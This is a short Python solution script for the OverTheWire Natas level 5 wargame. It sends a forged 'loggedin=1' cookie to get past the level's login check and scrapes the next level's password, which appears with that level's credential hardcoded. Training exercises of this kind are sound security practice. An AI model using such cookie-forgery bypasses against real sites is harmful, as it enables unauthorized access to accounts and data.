import re
import requests

username = "natas5"
password = "Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD"

url = 'http://' + username + '.natas.labs.overthewire.org'
auth = (username, password)
cookie = {"loggedin":"1"}
r = requests.get(url, auth=auth, cookies = cookie)
print(r.headers)
print(r.text)

print(re.findall(r'natas6 is (.*)</div>', r.text))
